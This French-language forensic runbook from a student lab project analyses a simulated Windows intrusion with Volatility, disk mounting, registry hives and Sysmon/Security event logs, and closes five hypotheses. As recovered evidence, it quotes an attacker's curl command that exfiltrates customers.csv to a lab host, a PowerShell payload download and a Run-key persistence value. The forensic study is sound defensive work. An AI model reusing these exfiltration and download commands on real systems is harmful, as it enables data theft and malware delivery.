# Projet 4 — Semaine 2, partie Analyste A (hôte : mémoire, disque, registre, journaux Windows)

> Ce runbook couvre uniquement la partie analyste A (hôte). La partie B
> (réseau/malware) est dans un document séparé à écrire par Amir.

**Scope prof (titre exact de la semaine 2) :** « Journaux, comptes,
processus et artefacts du système de fichiers. » Côté A, ça se découpe en
quatre blocs : mémoire (Volatility 3), disque (Autopsy), registre/
persistance (Autopsy ou Autoruns.exe), journaux Windows (Event Viewer ou
EvtxECmd). ~5–6h.

**Objectif de la semaine.** Clore chacune des 5 hypothèses posées en S1
(`~/dfir-s1/hypotheses-endpoint.md`, H1–H5) avec un verdict appuyé sur un
artefact précis — confirmée, infirmée, ou partielle — et produire un
rapport de findings + un arbre de processus de l'intrusion.

**Tout s'exécute sur `ANALYST01`** (SIFT Workstation, utilisateur
`sansforensics`, `192.168.100.50`), sur la copie locale des preuves
vérifiée en S1 (`~/dfir-s1/evidence/`, 40/40 `OK`, 0 `FAILED`).

**Format.** Identique à `semaine-0.md`/`semaine-1.md` : sections
numérotées, callouts `Watch out` inline, chaque section se termine par
`Checkpoint` + `Live run ⬜ pending`.

> **Watch out — lecture seule, toujours.** À partir d'ici vous travaillez
> directement sur les preuves copiées. Toutes les commandes de montage
> ci-dessous utilisent des options read-only (`--read-only`, `-o ro`).
> N'ouvrez jamais le `.vmdk` ni le `.vmem` en écriture — une preuve
> modifiée après S0, même par accident, casse la chaîne de custody pour
> de bon, contrairement à une erreur de commande qu'on peut juste
> recommencer.

---

## 0. Prérequis

```bash
# Sur ANALYST01
cd ~/dfir-s1/evidence
sha256sum --check MANIFEST.sha256 2>&1 | tail -3
# Doit encore donner 40/40 OK — si une ligne a changé depuis S1, arrêtez-vous

ls -la 04-memory/ 05-disk/ 06-evtx/ 07-wazuh/
```

Vérifiez les outils :

```bash
which vol              # Volatility 3 — l'exécutable s'appelle `vol`, pas `vol.py`
vol --help | head -5
which autopsy
qemu-nbd --version
```

> **Watch out — `vol.py` n'existe pas sur Volatility 3.** C'était le nom
> de l'exécutable sur Volatility 2. Sur SIFT récent, Volatility 3 est
> préinstallé et s'invoque avec `vol`. Si `which vol` ne retourne rien :
> `pip3 install volatility3 --break-system-packages` (ou dans un venv si
> SIFT bloque les installs système).

> **Watch out — `evtx_dump` n'existe pas sur SIFT, c'est `evtx_dump.py`
> avec l'extension.** Si `which evtx_dump` revient vide, installez
> `python-evtx` (`pip3 install python-evtx --break-system-packages`) et
> utilisez `evtx_dump.py` (le binaire est installé dans
> `/usr/local/bin/evtx_dump.py`). Toutes les commandes du §4 utilisent le
> nom avec `.py`.

**Checkpoint :** coffre local toujours intègre, Volatility 3 et Autopsy
disponibles.
**Live run :** ✅ _fait_ — `sha256sum --check` : `40/40 OK`, `vol`
disponible : `/usr/local/bin/vol`, `autopsy` : `/usr/bin/autopsy`,
`qemu-nbd` : `/usr/bin/qemu-nbd`, `evtx_dump.py` : **absent au départ**,
installé via `pip3 install python-evtx --break-system-packages`.

---

## 1. Analyse mémoire — Volatility 3

Cinq plugins, pas plus (scope allégé). Fichier mémoire :
`~/dfir-s1/evidence/04-memory/WKSTN01-<hex>.vmem` (~2.9 Go).

```bash
MEM=$(ls ~/dfir-s1/evidence/04-memory/WKSTN01-*.vmem)
echo "$MEM"   # confirme le nom exact — le suffixe hex varie par build
mkdir -p ~/dfir-s1/out/memory
```

> **Watch out — Volatility 3 télécharge les tables de symboles Windows
> (ISF) la première fois qu'il voit un build qu'il ne connaît pas.** Ça
> se fait automatiquement par internet au premier run de n'importe quel
> plugin `windows.*`. Si vous avez déjà débranché le NAT de `ens33` (S1
> §1 recommandait de le faire après l'installation des outils), ce
> premier run échoue silencieusement ou traîne en timeout. Rebranchez
> temporairement le NAT (`nmcli con up nat`), laissez le premier plugin
> tourner jusqu'au bout pour que le cache symbole se remplisse
> (`~/.cache/volatility3/`), puis redébranchez si vous voulez revenir à
> l'isolation stricte pour la suite.

> **Watch out — permissions sur le dossier symbols de Volatility 3.** Sur
> SIFT, Volatility 3 est installé dans `/opt/volatility3/` appartenant à
> root. Au premier plugin `windows.*`, il essaie d'écrire les symboles
> téléchargés dans son propre dossier et échoue :
> ```
> WARNING pdbutil: Cannot write necessary symbol file, please check
>   permissions on /opt/volatility3/lib/python3.12/site-packages/volatility3/symbols/windows/...
> Unable to validate the plugin requirements:
>   ['plugins.PsList.kernel.symbol_table_name']
> ```
> Fix une seule fois :
> ```bash
> sudo chown -R sansforensics:sansforensics \
>     /opt/volatility3/lib/python3.12/site-packages/volatility3/symbols/
> ```

> **Watch out — warning `.vmss`/`.vmsn` manquant, non-bloquant.** Volatility
> 3 affiche `No metadata file found alongside VMEM file. A VMSS or VMSN
> file may be required...` au démarrage. Le `.vmss` n'a pas été collecté
> en S0 (`vmrun suspend` l'a parfois purgé — voir Watch out du §10.1 de
> `semaine-0.md`) et il n'est pas dans le coffre. Volatility continue
> quand même avec juste le `.vmem` ; ignorez le warning.

### 1.1 — Liste de processus (`pslist`, `pstree`)

```bash
vol -f "$MEM" windows.pslist.PsList \
    | tee ~/dfir-s1/out/memory/pslist.txt

vol -f "$MEM" windows.pstree.PsTree \
    | tee ~/dfir-s1/out/memory/pstree.txt
```

Ce que vous cherchez : le processus correspondant à l'exécution de
`invoice_october.exe` (ou son nom une fois relancé/renommé), et tout
enfant suspect dans l'arbre — en particulier un processus qui ne devrait
pas avoir d'enfants (`explorer.exe` lançant directement un binaire
inconnu plutôt qu'un chemin `AppData\Roaming` typique d'un auto-start).

### 1.2 — Lignes de commande (`cmdline`)

```bash
vol -f "$MEM" windows.cmdline.CmdLine \
    | tee ~/dfir-s1/out/memory/cmdline.txt
```

Croisez avec le PID repéré en 1.1. Cherchez tout argument de ligne de
commande pointant vers `AppData\Roaming` ou un nom qui ne correspond pas
au chemin d'origine du fichier (signe d'un binaire copié/renommé —
pertinent pour H2).

### 1.3 — Connexions réseau en mémoire (`netscan`)

```bash
vol -f "$MEM" windows.netscan.NetScan \
    | tee ~/dfir-s1/out/memory/netscan.txt
```

Isolez toute connexion vers `192.168.100.30` (Kali). Notez le port local
et distant — directement pertinent pour **H4** (port C2 non-standard).
Gardez ce fichier de côté pour le recoupement avec le PCAP d'Amir en S3 —
la mémoire capture l'état au moment du suspend, le PCAP capture toute la
fenêtre, les deux doivent converger sur le même port.

### 1.4 — Détection d'injection (`malfind`)

```bash
vol -f "$MEM" windows.malfind.Malfind \
    | tee ~/dfir-s1/out/memory/malfind.txt
```

> **Watch out — ne vous attendez pas à un hit retentissant.** La chaîne
> d'attaque S0 (Meterpreter staged + `getsystem` via Named Pipe
> Impersonation + `kiwi`) n'injecte pas nécessairement du code de façon
> détectable par les heuristiques de `malfind`, qui cible surtout les
> pages mémoire avec permissions RWX suspectes. Un résultat vide ici est
> un résultat légitime — documentez-le comme tel (« malfind : aucun hit,
> cohérent avec les techniques utilisées ») plutôt que de chercher à
> forcer un hit qui n'existe pas.

### 1.5 — 🔴 Anomalie majeure : le `.vmem` du coffre est postérieur à l'attaque

Les 5 plugins ont tourné sans erreur, mais aucun n'a montré de signal
d'intrusion : `pslist`/`pstree` ne contiennent que ~78 processus
Windows standards, tous horodatés **2026-10-10** (System créé à
13:45:47, dernier svchost à 15:19:06) ; `netscan` ne montre aucune
connexion vers `192.168.100.30`, uniquement `wazuh-agent.exe →
192.168.100.10:1514` ; `malfind` sort deux hits bénins (MsMpEng.exe
JIT, SearchApp.exe WebView2) ; `cmdline` n'a aucun `invoice_october`,
`sysupdate`, `cmd.exe`, ni rien lié à Meterpreter.

Vérifications croisées confirmant que **le fichier `.vmem` du coffre
n'est pas la capture mémoire de la fenêtre d'attaque** :

```bash
# PCAP : fenêtre d'attaque = 07-10, pas 10-10
capinfos ~/dfir-s1/evidence/01-pcap/wk0.pcap | grep -i 'first\|last'
# First packet : 2026-10-07 13:59:56 ; Last : 2026-10-07 15:26:34

# Alertes Wazuh : même fenêtre
jq -r '.hits.hits[0]._source."@timestamp"' \
    ~/dfir-s1/evidence/07-wazuh/wk0-alerts.json

# Timeline S0 : la collecte s'est étalée jusqu'au 10-10
tail -1 ~/dfir-s1/evidence/03-timeline/attack.log
# 2026-10-10T15:41:51Z A: Wazuh alerts exported, evidence collection complete

# Confirmation finale : le binaire malveillant n'est NULLE PART dans la mémoire
strings -n 8 "$MEM" | grep -E 'invoice_october|sysupdate' | wc -l
# → 0
```

**Cause racine identifiée.** Le §10.3 de `semaine-0.md` prescrit « briefly
resume WKSTN01, export .evtx, re-suspend ». Chaque resume+suspend produit
un nouveau `.vmem` qui écrase l'ancien au même chemin. Entre la fin de la
chaîne d'attaque (07-10 ~15:30) et la clôture définitive de la collecte
S0 (10-10 15:41), WKSTN01 a été redémarrée au moins une fois — et c'est
le `.vmem` du dernier suspend (10-10) qui est dans le coffre, pas celui
de la fenêtre d'attaque.

> **Watch out — ce n'est PAS une violation d'intégrité, c'est une anomalie
> de collecte.** Le `.vmem` dans le coffre hashe correctement contre
> `MANIFEST.sha256` (40/40 OK) — personne ne l'a modifié après S0. Ce qui
> s'est passé est documentaire : le fichier qu'on a scellé n'est pas celui
> qu'on croyait sceller. À documenter dans la custody comme « anomalie de
> collecte » et pas comme « incident » (qui sous-entendrait falsification).
> Le disque et les EVTX **sont** de la fenêtre d'attaque (voir §2 et §4) et
> suffisent à clore H1, H2, H4, H5. Seule H3 (LSASS) perd son outil
> principal (`malfind` + arbre mémoire à l'instant du dump) — à traiter
> comme contrainte méthodologique en §5.

**Checkpoint :** 5 plugins exécutés, sorties sauvegardées dans
`~/dfir-s1/out/memory/`, anomalie `.vmem` identifiée et croisée avec
PCAP/Wazuh/attack.log.
**Live run :** ✅ _fait_ — mémoire **non exploitable pour l'attaque** ;
hypothèses réorientées vers disque (§2) + EVTX (§4).

---

## 2. Analyse disque — Autopsy

Image à charger : `05-disk/WKSTN01-000001.vmdk` (le snapshot courant —
c'est le fichier que l'appendice de `semaine-0.md` désignait déjà comme
le bon point d'entrée pour Autopsy). La chaîne complète de 27 fichiers
`.vmdk` reste sur le disque pour la custody, mais c'est ce descripteur-là
qu'on monte.

### 2.1 — Monter l'image (méthode SIFT native, `qemu-nbd`)

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --read-only -c /dev/nbd0 \
    ~/dfir-s1/evidence/05-disk/WKSTN01-000001.vmdk
sudo partprobe /dev/nbd0
lsblk /dev/nbd0
```

**Correction au `semaine-0.md` §1.** Le tableau de création VM annonçait
« Firmware : BIOS (not UEFI) », mais l'installation réelle a produit une
mise en page **UEFI** à 4 partitions :

```
nbd0p1   100M   FAT32 (EFI System Partition)
nbd0p2    16M   MSR (Microsoft Reserved — pas de système de fichiers)
nbd0p3  49.3G   NTFS → C:                 ← c'est elle qu'il faut monter
nbd0p4   560M   NTFS → WinRE
```

```bash
sudo file -sL /dev/nbd0p1 /dev/nbd0p2 /dev/nbd0p3 /dev/nbd0p4
# nbd0p3 est la grosse NTFS = C:
```

> **Watch out — c'est `nbd0p3`, pas `nbd0p2`.** La MSR (`nbd0p2`, 16 Mo)
> n'a pas de système de fichiers — `mount -t ntfs-3g /dev/nbd0p2` échoue
> avec un message de type `NTFS signature is missing`. Ignorez-la,
> montez `nbd0p3`.

> **Watch out — `qemu-nbd` seul ne suffit pas toujours pour une chaîne de
> snapshots.** Si `partprobe` ne voit rien ou si Autopsy refuse d'ouvrir
> le périphérique `/dev/nbd0`, c'est généralement que le descripteur
> `.vmdk` référence des extents dont le chemin relatif a changé pendant
> la copie S1 (improbable ici puisque toute l'arborescence a été
> préservée par `rsync`, mais vérifiez `strings
> WKSTN01-000001.vmdk | grep -i extent` si ça arrive). Alternative : les
> binaires `vmware-mount` ne sont pas disponibles sur Linux (c'est un
> outil Windows) — sur SIFT, `qemu-nbd` est la voie native. En dernier
> recours, Autopsy sait aussi ingérer un `.vmdk` directement comme source
> de données de type « Disk Image or VM File » sans montage préalable
> (via libvmdk) — plus lent à indexer mais évite le détour `nbd`.

### 2.2 — Monter la partition NTFS en lecture seule

```bash
sudo mkdir -p /mnt/wkstn01
sudo mount -t ntfs-3g -o ro,show_sys_files,streams_interface=windows \
    /dev/nbd0p3 /mnt/wkstn01
ls /mnt/wkstn01/Users/
```

Vous devez voir un profil `WKSTN01` (c'est le nom de compte local choisi
à l'install en S0 — pas `analyst`, pas `Administrator`).

### 2.3 — Exploration (variante CLI, Autopsy GUI non lancé)

**Écart assumé au runbook initial.** Le plan prévoyait un cas Autopsy GUI
(`Projet4-WKSTN01-S2`) avec ingestion complète (Recent Activity, File
Type Identification, Extension Mismatch Detector). En pratique on a
exploré directement le montage NTFS en lecture seule — mêmes artefacts
couverts (MFT, Prefetch, profil utilisateur, ruches registre), plus
rapide, pas d'attente d'ingestion. À documenter comme tel dans le
rapport §6.

```bash
# Fichiers du profil utilisateur
ls -la --time-style=full-iso /mnt/wkstn01/Users/WKSTN01/Downloads/
ls -la --time-style=full-iso /mnt/wkstn01/Users/WKSTN01/Documents/

# Prefetch
sudo ls -la --time-style=full-iso /mnt/wkstn01/Windows/Prefetch/

# Vérification intégrité binaire malveillant (3 sources, même hash)
sha256sum /mnt/wkstn01/Users/WKSTN01/Downloads/invoice_october.exe \
          ~/dfir-s1/evidence/08-malware/invoice_october.exe
```

**Ce qui a été trouvé (fenêtre 2026-10-07) :**

| Artefact | Chemin | Horodatage | Hypothèse |
|---|---|---|---|
| `invoice_october.exe` | `Users\WKSTN01\Downloads\` | 14:09:48 | H1 (dépôt) |
| `customers.csv` (133 o) | `Users\WKSTN01\Documents\` | 15:05:54 | H5 |
| `INVOICE_OCTOBER.EXE-45D1FC4B.pf` | `Windows\Prefetch\` | 15:01:40 | H1 (**exécution**) |
| `CURL.EXE-669CD8D3.pf` | `Windows\Prefetch\` | 15:08:53 | H5 (exfil) |
| `CMD.EXE-*.pf` (×2) | `Windows\Prefetch\` | 13:42:43, 15:27:37 | contexte |
| `POWERSHELL.EXE-AE8EDC9B.pf` | `Windows\Prefetch\` | 13:43:37 | parent de l'exécution (H1) |

Hash binaire disque identique au coffre
(`5eb50394034d6a28dbaaf84caf6c9d9a96a9fb2b23d3a00ccf246e9d5ee864a2`) —
intégrité disque confirmée, qui tranche avec l'anomalie mémoire du §1.5.

**Note parasites post-attaque :** Prefetch contient aussi
`MPCMDRUN.EXE-*.pf` @2026-10-10 13:57:31 et `POWERSHELL.EXE-CA1AE517.pf`
@2026-10-10 14:03:29 — artefacts des resume+suspend des 10-10, à
mentionner en §6 pour cohérence avec l'anomalie `.vmem` du §1.5.

> **Watch out — `sysupdate.exe` ne sera PAS trouvé sur disque** malgré ce
> que Sysmon 11 enregistrera (voir §4.2). `sudo find /mnt/wkstn01/ -iname
> 'sysupdate*'` retourne vide. Deux interprétations possibles : le fichier
> a été créé après le dernier flush NTFS et perdu au suspend, ou il a été
> nettoyé entre les sessions des 10-10. Ne forcez pas une conclusion — en
> §5, consignez les deux faits (Sysmon prouve l'écriture, disque ne la
> confirme pas) comme coexistants. La persistance est **tentée** mais pas
> **armée** sur l'état disque final.

**Checkpoint :** fichiers clés du profil utilisateur localisés et
horodatés via exploration CLI directe ; écart Autopsy GUI assumé.
**Live run :** ✅ _fait_ — `invoice_october.exe` @14:09:48,
`customers.csv` @15:05:54, Prefetch exécution @15:01:40, hash binaire
confirmé identique disque/coffre.

---

## 3. Registre / persistance

Deux voies possibles — utilisez celle qui marche le mieux selon votre
accès à une machine Windows.

### 3.1 — Voie A (recommandée sur SIFT) : module registre d'Autopsy

Le module **Recent Activity** activé en §2.3 extrait déjà les ruches
(`NTUSER.DAT`, `SOFTWARE`, `SYSTEM`) et peuple la vue « Registry » du cas
avec les clés `Run`, les services et les tâches planifiées trouvées. Dans
l'arbre du cas : `Results → Extracted Content → Run Programs` /
`Registry Hives`. Pas de RegRipper custom ici — c'est le module
intégré d'Autopsy, qui reste dans le scope allégé (outil « Autopsy », pas
un ajout).

Cherchez spécifiquement la clé :
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  WindowsUpdate = C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe
```

> **Watch out — si la valeur de la clé pointe vers un fichier qui
> n'existe pas sur le disque (vu dans le §9.3 de `semaine-0.md` comme
> risque connu si l'`upload` Meterpreter avait échoué), ce n'est pas une
> erreur d'analyse — c'est un IOC en soi.** Une clé Run orpheline (valeur
> présente, fichier cible absent) indique une persistance *planifiée mais
> jamais aboutie*, ou un binaire supprimé après coup. Documentez l'état
> exact (clé présente + fichier présent, ou clé présente + fichier
> absent) plutôt que de supposer que la persistance a réussi.

### 3.2 — Voie B (si disponible) : Autoruns.exe sur une machine Windows

Autoruns.exe est un outil Windows-only — s'il n'y a pas de poste Windows
disponible pour l'analyste, la Voie A suffit et couvre l'exigence prof
(« via Autopsy **ou** Autoruns.exe »). Si vous avez accès à un poste
Windows :

1. Copiez `SOFTWARE`, `SYSTEM` et le `NTUSER.DAT` du profil `WKSTN01`
   depuis `/mnt/wkstn01/Windows/System32/config/` et
   `/mnt/wkstn01/Users/WKSTN01/NTUSER.DAT` vers une clé USB ou un partage
   temporaire.
2. Sur la machine Windows, Autoruns → `File → Analyze Offline System` →
   pointez sur les ruches copiées.
3. Onglet `Logon` pour les clés Run, `Services` et `Scheduled Tasks` pour
   le reste.

> **Watch out — ne copiez jamais les ruches en les prenant directement
> depuis un disque monté en écriture.** Le montage du §2.2 est `ro` —
> gardez-le ainsi même pour cette extraction ; copier un fichier *depuis*
> un montage lecture-seule ne pose aucun problème, c'est uniquement
> l'écriture *vers* le montage qui est interdite.

**Méthode effective (variante CLI pure, cohérente avec §2.3).** Au lieu
d'Autopsy GUI, inspection directe de `NTUSER.DAT` via `hivexsh` sur le
montage lecture-seule :

```bash
# Grep brut sur la ruche pour les noms de valeurs suspects
grep -aoiE 'sysupdate|WindowsUpdate|AppData.Roaming' \
    /mnt/wkstn01/Users/WKSTN01/NTUSER.DAT | sort -u

# Lecture structurée de la clé Run
hivexsh -d /mnt/wkstn01/Users/WKSTN01/NTUSER.DAT <<'EOF'
cd \Software\Microsoft\Windows\CurrentVersion\Run
lsval
EOF
```

**Résultat :** la clé Run ne contient que `OneDrive` (chemin OneDrive.exe
légitime). Pas de valeur `WindowsUpdate`. Mtime de `NTUSER.DAT` =
2026-10-07 12:55:22 — **antérieur à l'écriture Sysmon 13** (voir §4.2).

> **Watch out — divergence Sysmon vs ruche sur disque, ne pas la masquer.**
> Sysmon event 13 enregistre l'écriture de la clé `Run\WindowsUpdate →
> …\sysupdate.exe` à 15:05:09 côté EVTX (§4.2 confirme). La ruche NTUSER.DAT
> sur disque n'en garde pas trace. Les deux faits sont vrais et doivent
> coexister en §5 : la persistance a été **tentée et enregistrée par
> l'instrumentation**, mais l'état final sur disque ne la préserve pas —
> hive non flushé avant suspend, ou profil réinitialisé entre les sessions
> des 10-10. H2 se formule donc « confirmée (écriture) — persistance non
> armée ». Ne tranchez pas sur quelle hypothèse causale est la bonne tant
> que vous ne pouvez pas la prouver.

**Voie B (Autoruns.exe) non tentée** — pas de machine Windows
disponible pour l'analyste. Conforme au scope allégé.

**Checkpoint :** clé Run inspectée (voie A), divergence Sysmon vs ruche
documentée.
**Live run :** ✅ _fait_ — voie utilisée : A (hivexsh + grep sur ruche
RO) ; valeurs présentes dans Run : `OneDrive` uniquement ; `WindowsUpdate`
absent du disque malgré présence dans les events Sysmon.

---

## 4. Journaux Windows

Fichiers (**noms réels sur disque**, pas les noms de canaux Windows
originaux — ils ont été renommés en S0 §10.3 par la boucle
`$l -replace '[\\/]','_'` qui a aplati `Microsoft-Windows-Sysmon/Operational`
en simplement `Sysmon`) :

```
06-evtx/
├── Application.evtx    (1 118 208 o)
├── PowerShell.evtx    (11 603 968 o)
├── Security.evtx       (4 263 936 o)
├── Sysmon.evtx         (1 118 208 o)
└── System.evtx         (1 118 208 o)
```

EvtxECmd est un outil Windows — sur SIFT, l'équivalent natif est
`python-evtx` qui fournit **`evtx_dump.py`** (avec l'extension `.py`,
contrairement à ce qu'on pourrait attendre).

```bash
which evtx_dump.py || pip3 install python-evtx --break-system-packages
mkdir -p ~/dfir-s1/out/evtx
cd ~/dfir-s1/evidence/06-evtx
```

### 4.1 — Logons et créations de processus (`Security.evtx`)

```bash
evtx_dump.py Security.evtx > ~/dfir-s1/out/evtx/security.xml

# 4624 = logon réussi, 4625 = logon échoué, 4688 = création de processus
# ⚠️ regex avec [^>]* — python-evtx émet <EventID Qualifiers="">N</EventID>
grep -cE '<EventID[^>]*>4624</EventID>' ~/dfir-s1/out/evtx/security.xml
grep -cE '<EventID[^>]*>4625</EventID>' ~/dfir-s1/out/evtx/security.xml
grep -cE '<EventID[^>]*>4688</EventID>' ~/dfir-s1/out/evtx/security.xml
```

> **Watch out — `python-evtx` ajoute `Qualifiers=""` à l'attribut
> EventID.** Un `grep '<EventID>4624</EventID>'` sans `[^>]*` retourne
> **0** sur tous les fichiers alors que les events y sont bien. C'est le
> piège le plus bête à perdre une heure dessus — toutes les commandes de
> comptage de ce §4 utilisent `<EventID[^>]*>N</EventID>`.

> **Watch out — comptez d'abord, lisez ensuite.** Un `Security.evtx` sur
> une seule VM pendant une fenêtre de quelques heures peut facilement
> contenir plusieurs centaines d'événements 4688 (chaque processus
> système en génère un). Ne lisez pas le XML brut linéairement — filtrez
> sur la fenêtre temporelle de l'attaque (comparez avec les horodatages
> de `03-timeline/attack.log` dans le coffre) avant d'inspecter le détail
> de chaque événement.

Pour isoler juste la fenêtre d'attaque, croisez avec `attack.log` :

```bash
cat ~/dfir-s1/evidence/03-timeline/attack.log | head -5
# notez l'heure UTC de "tcpdump started" et de "tcpdump stopped" —
# ce sont vos bornes de fenêtre pour filtrer le XML
```

### 4.2 — Sysmon : events 1, 3, 10, 13

```bash
evtx_dump.py Sysmon.evtx > ~/dfir-s1/out/evtx/sysmon.xml

for eid in 1 3 10 11 13; do
  echo "EventID $eid: $(grep -cE "<EventID[^>]*>$eid</EventID>" \
    ~/dfir-s1/out/evtx/sysmon.xml)"
done
```

- **Event 1 (process create)** — recoupe `pslist`/`pstree` du §1.1 avec
  la ligne de commande exacte au moment de l'exécution, horodatée
- **Event 3 (network connect)** — recoupe `netscan` du §1.3 ; Sysmon log
  l'IP/port au moment précis de la connexion, utile si la mémoire ne
  montrait qu'un instantané
- **Event 10 (process access)** — cherchez un accès à `lsass.exe` par un
  processus inattendu : c'est la signature la plus directe de **H3**
  (dump de credentials via `kiwi`/mimikatz)
- **Event 13 (registry value set)** — devrait montrer l'écriture de la
  clé `Run` du §3, avec horodatage exact de la persistance

> **Watch out — l'event 10 (process access) est volumineux et bruyant par
> design même sur une config SwiftOnSecurity.** Filtrez spécifiquement
> sur `TargetImage` contenant `lsass.exe` plutôt que de parcourir tous les
> accès processus :
> ```bash
> grep -B5 'lsass.exe' ~/dfir-s1/out/evtx/sysmon.xml | grep -A5 '<EventID>10</EventID>'
> ```

**Compteurs réels :** Event 1 = 211, Event 3 = 5, **Event 10 = 0**,
Event 11 = 77, Event 13 = 64. Fenêtre couverte : 2026-10-07 13:14:42 →
15:29:40.

**Findings clés (horodatages UTC) :**

- **Sysmon 11 @14:09:48** — création de `invoice_october.exe` dans
  `Downloads` par `powershell.exe` PID 5668 (user `WKSTN01\WKSTN01`) =
  H1 (dépôt).
- **Sysmon 1 @15:01:32** — exécution de `invoice_october.exe` PID 3568,
  **parent `powershell.exe`** (pas `explorer.exe` — écart au récit S0
  §9.2 qui montrait `Start-Process` depuis PowerShell, cohérent),
  IntegrityLevel High, SHA256
  `5EB50394034D6A28DBAAF84CAF6C9D9A96A9FB2B23D3A00CCF246E9D5EE864A2`.
- **Sysmon 3 @15:01:30 et @15:21:21** — `invoice_october.exe` →
  `192.168.100.30:4444` TCP, direction Initiated. **= H4 côté hôte.**
- **Sysmon 13 @15:05:09** — écriture
  `HKU\S-1-5-21-…-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  = C:\Users\WKSTN01\AppData\Roaming\sysupdate.exe` par PID 3568.
  **IOC exact de H2.**
- **Sysmon 11 @15:08:33** — création de `AppData\Roaming\sysupdate.exe`
  par PID 3568.
- **Pas de Sysmon 1 pour `sysupdate.exe`** — le binaire de persistance
  n'a jamais été exécuté dans la fenêtre observée.
- **Sysmon 10 = 0** sur 13115 events. Inhabituel sur SwiftOnSecurity.
  **Le fichier `sysmonconfig-export.xml` effectivement chargé n'est pas
  dans le coffre** (`08-malware/` ne contient que le binaire malveillant,
  pas la config Sysmon) — impossible de prouver que la config active
  logguait bien Event 10. À traiter en §5 comme contrainte méthodologique
  pour H3 (« non concluante » et non « infirmée »).

> **Watch out — l'event 10 (process access) est volumineux et bruyant par
> design même sur une config SwiftOnSecurity.** Filtrez spécifiquement
> sur `TargetImage` contenant `lsass.exe` plutôt que de parcourir tous les
> accès processus :
> ```bash
> grep -B5 'lsass.exe' ~/dfir-s1/out/evtx/sysmon.xml \
>     | grep -A5 '<EventID[^>]*>10</EventID>'
> ```

**Security.evtx (compteurs réels) :** 4624=207, **4625=1**, 4688=773,
4672=179 ; CommandLine non vide : 704/773.

- **4625 unique @13:06:40** — TargetUserName=WKSTN01, LogonType=2
  (console), Status 0xc000006d / Sub 0xc000006a (bad password), IP
  127.0.0.1. **Bénin** (frappe ratée à la console avant l'attaque).
- **4688 @15:01:53** — `invoice_october.exe` lancé, parent
  `powershell.exe` (confirme Sysmon 1).
- **4688 @15:05:55 et @15:09:53** — deux
  `curl.exe -X POST --data-binary "@customers.csv" -H "Content-Type:
  application/octet-stream" http://192.168.100.30:8000/exfil/customers`,
  parent `cmd.exe`. **IOC exact de H5.**
- **4688 enfants d'`invoice_october.exe` post-attaque :**
  `backgroundTaskHost.exe` @15:05:46, `SearchProtocolHost.exe`
  @15:08:47 — effets de bord UWP/indexeur, pas de la chaîne malveillante.
- **4688 baseline @12:55:0x** — les `reg add` PowerShell logging de S0
  §2d, pas des actions attaquant.

### 4.3 — PowerShell (script block logging)

```bash
evtx_dump.py PowerShell.evtx > ~/dfir-s1/out/evtx/powershell.xml
grep -c 'ScriptBlockText' ~/dfir-s1/out/evtx/powershell.xml
# → 619
```

**Signal utile :** le `Invoke-WebRequest` de `invoice_october.exe` est
tracé :

```
Invoke-WebRequest -Uri http://192.168.100.30:8080/invoice_october.exe `
    -OutFile C:\Users\WKSTN01\Downloads\invoice_october.exe
```

### 4.4 — Application.evtx — canal non exploitable

```bash
evtx_dump.py Application.evtx > ~/dfir-s1/out/evtx/application.xml
```

Uniquement des events `SecurityCenter → SECURITY_PRODUCT_STATE_ON` à
11:05 sur `Computer=DESKTOP-6268TBA` (hostname pré-rename, voir S0 §2b).
Aucun event dans la fenêtre attaque — documenter comme canal muet
légitime en §6.

**Checkpoint :** 5 journaux extraits et filtrés sur la fenêtre d'attaque,
events clés comptés avec regex `[^>]*`, findings consignés par
hypothèse.
**Live run :** ✅ _fait_ — fenêtre d'attaque (UTC) : 2026-10-07 13:14:42
→ 15:29:40 ; event 10 sur `lsass.exe` trouvé : **0** (config Sysmon
chargée non disponible dans le coffre) ; event 13 (Run key) trouvé : **1
occurrence précise de `Run\WindowsUpdate` @15:05:09**.

---

## 5. Clôturer les hypothèses endpoint (H1–H5)

Reprenez `~/dfir-s1/hypotheses-endpoint.md` et ajoutez, pour chaque
hypothèse, un verdict appuyé sur un artefact précis des sections
précédentes — ne laissez aucune des 5 sans verdict, même si le verdict
est « infirmée » ou « non concluant avec les outils du scope allégé ».

| # | Hypothèse | Verdict | Artefact(s) à l'appui |
|---|-----------|---------|------------------------|
| H1 | Exécution manuelle par l'utilisateur | **CONFIRMÉE** | Sysmon 1 @15:01:32 (PID 3568, parent `powershell.exe`, IntegrityLevel High) + 4688 @15:01:53 + Prefetch `INVOICE_OCTOBER.EXE-*.pf` @15:01:40 + hash binaire identique disque/coffre. Nuance : parent `powershell.exe` (`Start-Process`), pas `explorer.exe`. |
| H2 | Persistance via clé Run HKCU | **CONFIRMÉE (écriture) — persistance non armée** | Sysmon 13 @15:05:09 (écriture `Run\WindowsUpdate = …\sysupdate.exe`) + Sysmon 11 @15:08:33 (création binaire). MAIS `NTUSER.DAT` sur disque ne contient que `OneDrive`, et `find` ne trouve pas `sysupdate.exe` — persistance tentée et enregistrée, non confirmée sur l'état disque final. |
| H3 | Accès identifiants via lecture mémoire LSASS | **NON CONCLUANTE — canal muet, réserve méthodologique** | Sysmon event 10 = 0/13115 ; mémoire du 10-10, pas de l'attaque (§1.5) ; `sysmonconfig-export.xml` chargé non disponible dans le coffre — impossible de prouver que la config logguait Event 10. Préférer « non concluante » à « infirmée » — l'instrumentation disponible ne permet pas de trancher dans un sens ni dans l'autre. |
| H4 | C2 sur port non-standard | **CONFIRMÉE côté hôte — port 4444/TCP vers 192.168.100.30 — validation PCAP pendante (S3)** | Sysmon 3 ×2 @15:01:30, @15:21:21 : `invoice_october.exe → 192.168.100.30:4444` TCP Initiated. Confirmation définitive (canal, protocole applicatif, durée) appartient au PCAP d'Amir. |
| H5 | Exfiltration depuis le profil utilisateur | **CONFIRMÉE** | 4688 ×2 (`curl.exe -X POST … http://192.168.100.30:8000/exfil/customers`) @15:05:55, @15:09:53 + MFT `customers.csv` 133 o @15:05:54 dans `Documents\` + `attack.log` POST 133 o reçu @15:08:54. Chaîne complète fichier→commande→reception. |

> **Watch out — H4 n'est que partiellement close côté hôte.** Sysmon 3
> montre ce que l'hôte voyait au moment des connexions, mais la
> confirmation définitive du canal C2 (direction, protocole applicatif,
> durée totale) appartient au PCAP, côté B. Formulation acceptable :
> « confirmée côté hôte, à valider avec le PCAP en S3 » — pas « confirmée »
> tout court.

